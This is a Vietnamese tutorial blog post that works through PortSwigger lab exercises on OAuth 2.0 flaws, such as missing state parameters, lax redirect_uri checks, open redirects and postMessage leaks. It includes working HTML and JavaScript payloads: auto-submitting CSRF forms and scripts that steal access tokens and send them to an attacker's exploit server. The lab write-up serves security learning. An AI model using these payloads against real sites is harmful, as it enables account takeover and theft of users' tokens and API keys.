## III. Demo một số tấn công vào cơ chế OAuth
Trong phần này mình sẽ demo một số kiểu tấn công của OAuth dựa trên các bài lab được thiết kế bởi [Portswigger](https://portswigger.net/web-security/oauth).

### 1. Lỗ hổng ở phía ứng dụng client

#### a. Áp dụng sai implicit flow
Trong bài này, chúng ta sẽ lợi dụng điểm yếu trong cơ chế xác thực của ứng dụng web sử dụng OAuth với implicit grant type để có thể truy cập bất hợp pháp vào tài khoản của người dùng khác.

Đề bài:

![](https://images.viblo.asia/38446bf5-8510-4c92-b937-b0ed4c8e0848.png)

Link bài lab: [https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)

Trong bài này, chúng ta sẽ lợi dụng lỗ hổng trong cơ chế xác thực OAuth của ứng dụng web để có thể đăng nhập vào tài khoản của Carlos, với điều kiện là chúng ta biết email của người dùng này.

Trước hết, tìm hiểu qua về cơ chế xác thực của ứng dụng web này. Đầu tiên, có thể chắc chắn ứng dụng này dùng OAuth để xác thực với request khởi tạo 

![](https://images.viblo.asia/c810708c-d04f-484f-9426-f3382b6dfdff.png)

Ở đây, có thể thấy *response_type* của request là *token*, nên có thể đoán rằng trang web sử dụng implicit grant type. Ngoài ra, tham số *state* cũng không nằm trong request, đồng nghĩa với các tấn công CSRF có thể thực hiện được.

Sau khi đang nhập và cấp quyền cho ứng dụng, ứng dụng sẽ gửi 1 request call back và browser sẽ lấy được access token trả về

![](https://images.viblo.asia/a4f7fc18-2153-46e8-953d-6d33c56657d8.png)

Sau đó sử dụng access token này để truy cập tới `/me` để lấy dữ liệu với token truyền trong Authorizattion header

![](https://images.viblo.asia/e4915d28-2e46-4f3c-8032-c4c0575d7988.png)

Tới đây mọi thứ vẫn ổn. Tuy nhiên sau đó là một request để xác minh người dùng của ứng dụng web

![](https://images.viblo.asia/2bf008ef-24f1-43b2-b293-156c6deaef6e.png)

Ở đây, ứng dựng web gửi các thông tin đăng nhập của người dùng lên backend để xác minh người dùng nhằm mục đích đăng nhập. Tuy nhiên, backend lại chỉ sử dụng email để thực hiện xác minh thay vì cặp key-pair giữa email và token. Lợi dụng điểm này, ta có thể thay email của mình thành email của người khác (cụ thể ở bài này là Carlos) để có được quyền truy cập vào tài khoản của họ.

![](https://images.viblo.asia/9954c0a9-c782-4787-a41e-3afe2bbd2ec6.png)

![](https://images.viblo.asia/714b16f4-11f5-4c4d-8d57-a472530ca64a.png)

==> Như vậy ở đây, việc sử dụng OAuth làm cơ chế xác thực nhưng lại không có một cơ chế xác minh an toàn đối với request xác thực của người dùng ở phía client đã cho phép kẻ xấu (là mình đây) có thể lợi dụng để lấy quyền truy cập vào tài khoản của người khác.

#### b. Thiếu việc bảo vệ tấn công CSRF

Tấn công Cross-Site Request Forgery là kiểu tấn công mà kẻ tấn công lừa người sử dụng truy cập tới một trang web độc hại (hacker có thể  kiểm soát), thông qua trang đó kẻ tấn công có thể tấn công một trang khác (Cross-site) mà người dùng đã xác minh (thông thường là đã có cookie). Để chống lại kiểu tấn công này, thông thường là các request quan trọng sẽ có thêm một csrf token để ngăn các tấn công cross site.

Trong triển khai OAuth, tham số `state` được tính là optional tuy nhiên lại rất quan trọng khi nó được sử dụng như một csrf token để bảo vệ trang web. Việc thiếu hoặc sử dụng tham số này sai cách sẽ cho phép kẻ tấn công sử dụng CSRF tấn công ứng dụng web.

Đề bài:

![](https://images.viblo.asia/34bb3265-cb72-4216-9491-561a18edf964.png)

Link bài lab: [https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)

Trong bài này, trang web hỗ trợ 2 cơ chế xác minh đăng nhập là basic auth với username/password và đăng nhập với OAuth. Tài khoản OAuth có thể được kết nối tới một tài khoản thông thường. Lợi dụng tính năng này chúng ta sẽ tấn công để có thể kết nối tài khoản OAuth của mình với tài khoản đăng nhập của admin.

Đầu tiên, đăng nhập thông thường và vào trang của người dùng.

![](https://images.viblo.asia/3372e707-ec4c-4df3-903c-d293fe7cdd59.png)

Ở đây, có một tính năng để liên kết tài khoản của người dùng với một tài khoản OAuth.  Request gửi lên sẽ gửi authorization code của tài khoản Oauth lên để liên kết với tài khoản. 

![](https://images.viblo.asia/78dbd2be-f700-4bfb-b8d7-86fc877ca453.png)

Tuy nhiên, ta có thể thấy ở đây không có một tham số nào giống với csrf token. Nên có thể tấn công CSRF để kết nối tài khoản OAuth của mình với một tài khoản khác. Ở trên một trang khác, tạo một đoạn script:

```html
<form method="GET" action="https://ac1a1ff61fcac64e809411d200820039.web-security-academy.net/oauth-link">
<input name="code" value="CVyIModsXCw9fnokD3Z8G2ueWgT03J4Jg_dxzRWj7Ac" type="hidden">
<input type="submit" value="Submit Request">
</form>
<script>
document.forms[0].submit();
</script>
```

Khi tài khoản admin truy cập tới trang này, tự động sẽ gửi request tới `/oauth-link` với code của tài khoản OAuth của mình và ta có thể đăng nhập bằng tài khoản OAuth này để tới được trang admin.



### 2. Lỗ hổng OAuth ở phía server OAuth
Đôi khi, ngay cả bên cung cấp dịch vụ OAuth cũng có lỗ hổng bảo mật cho phép kẻ tấn công có thể sử dụng để tấn công các dịch vụ khác sử dụng dịch vụ OAuth này. 
#### a. Lộ authorization code hoặc access token
Tham số `redirect_uri` là tham số quan trọng để server có thể sử dụng để gửi trả về authorization code. Việc không xử lí tham số này có thể cho phép kẻ tấn công lợi dụng để đánh cắp authorization code để truy cập trái phép tới tài khoản người dùng.

Đề bài:

![](https://images.viblo.asia/cbc6d89f-7d91-43fe-84a3-6def743aa4cd.png)

Trong bài này chúng ta sẽ lợi dụng lỗ hổng trong cơ chế xác thực OAuth của trang web nhằm đánh cắp authorization code của admin để có thể truy cập trái phép tới tài khoản này. Đầu tiên, ta thấy trang web này sử dụng cơ chế OAuth để xác minh người dùng:

![](https://images.viblo.asia/18de5f7e-70a4-4b02-b7bd-ae797a4094af.png)

Ở đây, ta chú ý tham số `redirect_uri`. Đây là nơi mà server sẽ trả authorization code về cho phía client. Tuy nhiên, authorization server không hề xử lí tham số này, điểu này, đồng thời trong request gửi lên không có tham số `state`. Điều này cho phép chúng ta có thể tấn công csrf để lấy cắp được authorization code. Ở 1 trang web khác, sử dụng đoạn script

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac7b1f5a1fef72ac80dd1a3e0218002f.web-security-academy.net/auth">
      <input type="hidden" name="client_id" value="qinj9zx54hibvp9ifu9i0" />
      <input type="hidden" name="redirect_uri" value="https://ac1f1fd61f72721f80461afb01a60017.web-security-academy.net" />
      <input type="hidden" name="response_type" value="code" />
      <input type="hidden" name="scope" value="openid profile email" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Tiếp theo, gửi đường dẫn trang này cho admin. Khi tài khoản admin truy cập, một request đăng nhập với OAuth sẽ được gửi lên với cookie của admin và code trả về sẽ gửi tới trang chúng ta kiểm soát là `https://ac1f1fd61f72721f80461afb01a60017.web-security-academy.net`. 

![](https://images.viblo.asia/1f215795-a445-4ae9-832a-0d0dc979f787.png)

Sử dụng code này để đăng nhập ta có thể truy cập tới tài khoản của admin

![](https://images.viblo.asia/97a42f89-142f-4983-813b-754f326239ad.png)

#### b. Đánh cắp authorization code và access token thông qua open redirect
Đôi khi, server có thể đã kiểm tra tham số redirect_uri rồi, tuy nhiên, vẫn còn các lỗ hổng khác có thể lợi dụng để tấn công tiếp tham số này. Ví dụ cụ thể có thể thấy trong bài lab tiếp theo.

Đề bài:

![](https://images.viblo.asia/4bdfe726-12f1-4272-9d11-993de0628b15.png)

Ở đây, trang web có tồn tại một lỗ hổng open redirect cho phép kẻ tấn công lợi dụng để lấy được access token. Nhiệm vụ của chúng ta là lợi dụng lỗ hổng này để truy cập được API key của tài khoản admin.

Trước hết, vẫn bắt đầu với request khởi tạo của OAuth.

![](https://images.viblo.asia/3236be35-af08-409f-ad82-acc631879410.png)

Thử thay đổi `redirect_uri` thành một uri khác, ta sẽ nhận về response code 400

![](https://images.viblo.asia/c6520574-5bd8-4029-bbb6-a93ce95424cc.png)

Tuy nhiên, ở đây tham số này lại có lỗi path traversal

![](https://images.viblo.asia/59aa5d77-12a3-4c02-9b4c-e8de7d1d4a9c.png)

![](https://images.viblo.asia/95d613a1-749e-4d9c-b5a2-78442ae6b5c9.png)

Tuy nhiên, path trarversal không cho phép chúng ta truy cập tới một trang web mà ta kiểm soát được. Vì thế phải tìm một lỗ hổng cho phép điểu đó trong trang web. Vào một bài post, ở chức năng next cuối bài, khi bấm vào ta sẽ thấy request dạng

![](https://images.viblo.asia/cc2023e7-22c8-4067-97a5-91b9fd783865.png)

Tham số path ở đây khá nhạy cảm, thử thay thế bằng một url bất kì thì có thể thấy nó dính lỗi open redirect ở đây

![](https://images.viblo.asia/8dfcc1fe-df69-4fd3-adb0-7fd7485acf39.png)

![](https://images.viblo.asia/265d4b53-139a-49ad-8757-c4414d40adeb.png)

Như vậy, ta có thể lợi dụng lỗ hổng này và path traversal ở trên để redirect người dùng tới trang chúng ta mong muốn. Tuy nhiên còn một vấn đề là access token được gửi dưới dạng hash, và không được capture trong request.

![](https://images.viblo.asia/15a97c08-292c-4808-913f-a739d6a7c7ca.png)

Thế nên ta cần một đoạn script nho nhỏ để lấy được giá trị hash này tại trang của mình. Giờ thì kết hợp những điều trên, thực hiện tấn công csrf để lấy token với script:

```http
<script>
  if (!document.location.hash) {
    window.location = 'https://ac8b1f311edc8c47804f327a02250031.web-security-academy.net/auth?client_id=w44nru0dzuan2a9cde0nx&redirect_uri=https://ac631f0c1ec18c86808a325800d3004a.web-security-academy.net/oauth-callback/../post/next?path=https://ac311f261eb88c568040322201710031.web-security-academy.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
  } else {
    window.location = '/?'+document.location.hash.substr(1)
  }
</script> 
```

Gửi trang này cho admin và ta có thể lấy được access token

![](https://images.viblo.asia/c91cf28b-2a89-4e63-a4ac-a76f4125aee1.png)

Sử dụng token này để lấy được api key của admin

![](https://images.viblo.asia/15b314c6-8f7a-4e5a-98dc-72541842c964.png)

![](https://images.viblo.asia/f108a30c-ed53-45df-b5ac-d9d3d90ae25c.png)

#### c. Đánh cắp authorization code và access token thông qua 1 trang web proxy
Vẫn là các lỗ hổng như ở bài trên, tuy nhiên không có lỗ hổng nào cho chúng ta có thể open redirect, vậy chúng ta sẽ làm thế nào? Mục tiêu vẫn sẽ là lấy được access token của user, thế nên thay vì lấy thông qua 1 trang của mình, ta có thể sử dụng một trang proxy để có được access token. Demo có thể xem ở bài lab tiếp theo:

Đề bài:

![](https://images.viblo.asia/f41b2282-1026-423f-a2c9-5ef40ea1f311.png)

Trong bài này, chúng ta vẫn sẽ thực hiện khai thác cơ chế OAuth của trang web. Chúng ta có thể lợi dụng lỗ hổng này để lấy được access token của người dùng thông qua một trang proxy nào đó thông qua một lỗ hổng khác của trang.

Đầu tiền, chúng ta (lại) xem qua request init của OAuth của trang:

![](https://images.viblo.asia/546dc998-8097-4c1b-9a92-d033e519c981.png)

Ở đây, trang vẫn sử dụng implicit grant type, nghĩa là access token gửi vẫn thông qua browser của người dùng.  Ở đây, vẫn thiếu parameter *state* nên khả năng cao chúng ta có thể tấn công CSRF được. Tiếp theo là khai thác thử vào tham số *redirect_uri* của request, nếu thay vào đó 1 địa chỉ của trang khác, ta sẽ nhận được code 400:

![](https://images.viblo.asia/3ff1f2e1-bdda-4211-9741-be071de5ae62.png)

![](https://images.viblo.asia/0a21d158-b701-47d3-bc9f-28dc1f1d29c9.png)

Tuy nhiên, vẫn giống bài trên, nếu sử dụng path traversal thì trang vẫn sẽ chấp nhận request:

![](https://images.viblo.asia/0f348597-056a-49c4-98e0-d674befe2426.png)

![](https://images.viblo.asia/719b464c-3dff-4e19-a2c5-7a9ab655ed6a.png)

Như vậy, ta có thể sử dụng điều này để tiếp tục tấn công xa hơn. 

Tiếp theo, tiếp tục tìm kiếm trong trang web. Ở đây, ta không còn có thể tìm được open redirect khi mà chức năng **next post** đã không còn nữa. Tuy nhiên, sau khi comment bất kì vào một bài viết, ta có thể nhận thấy 1 request tới **/post/comment/comment-form**:

![](https://images.viblo.asia/466159b0-8247-4fe2-8fff-8aa83e15b528.png)

![](https://images.viblo.asia/b4b95f7f-623a-497a-b4d8-267fff40d3ac.png)

Trang này có sử dụng *postMessage* và chấp nhận origin \* và lấy các thông tin từ comment-form và hash parameter. Từ các thông tin trên, trên *Exploit server* chúng ta sẽ tạo một đoạn mã để lấy ra được thông tin access token khi đi qua **/post/comment/comment-form**

```html
<html>
<body>
<iframe src="https://accb1ff01ebae73e8075104302ab0045.web-security-academy.net/auth?client_id=wwyf62rvz13umtvlfylj9&redirect_uri=https://ac4c1ff01efce75c804310f100510000.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
<script>
  window.addEventListener('message', function(e) {
    fetch("/" + encodeURIComponent(e.data.data))
  }, false)
</script> 
</body>
</html>
```

Khi người dùng truy cập vào trang web của chúng ta, iframe sẽ được load lên và thực hiện một OAuth request. Sau đó access token trả về trang **/post/comment/comment-form** mà chúng ta muốn. Sử dụng đoán script dưới để lấy hash param được trả về và gửi tới exploit server của chúng ta để lấy được access token.

![](https://images.viblo.asia/f6123064-45ac-4353-b26d-612b5507696e.png)

Sử dụng access token này của admin để có thể lấy ra các thông tin của người dùng này:

![](https://images.viblo.asia/283fcfea-ae63-4b58-806c-25e24fba4aca.png)

![](https://images.viblo.asia/96b59084-3751-4dd1-bd76-dee7a50570b8.png)

## Kết luận
Ở trong phần 2 này, mình đã thực hiện demo một số kiểu tấn công phổ biến nhất trong triển khai OAuth để có được các thông tin nhạy cảm của người dùng như authentication code, access token hay api key. Các bài lab trong bài viết được thiết kế và public bởi Portswigger tại [đây](https://portswigger.net/web-security/oauth).

Ngoài các tấn công trên, còn rất nhiều cách để khai thác lỗ hổng của các hệ thống sử dụng OAuth. Mọi người có thể xem lại phần 1 về [Những vấn đề bảo mật cần cân nhắc khi sử dụng OAuth 2.0](https://viblo.asia/p/oauth-20-va-vai-van-de-bao-mat-lien-quan-phan-1-yMnKM28zZ7P#_ii-nhung-van-de-bao-mat-can-can-nhac-khi-su-dung-oauth-20-4) của mình để thấy rõ hơn. Thêm vào đó, có thể thấy các demo này chủ yếu tập trung vào implicit grant type khi mà mức độ bảo mật của grant type này khá thấp. Vậy nên như phần 1 đã nói thì nên hạn chế tối đa việc sử dụng implicit grant type khi triển khai OAuth 2.0.

Bài viết này là sự tìm hiểu của cá nhân mình về framework OAuth 2.0, có thể còn một số chỗ thiếu sót hoặc chưa tường minh, hi vọng nhận được thêm các góp ý được mọi người.

## References
- [https://tools.ietf.org/html/rfc6749](https://tools.ietf.org/html/rfc6749)
- [https://portswigger.net/web-security/oauth](https://portswigger.net/web-security/oauth)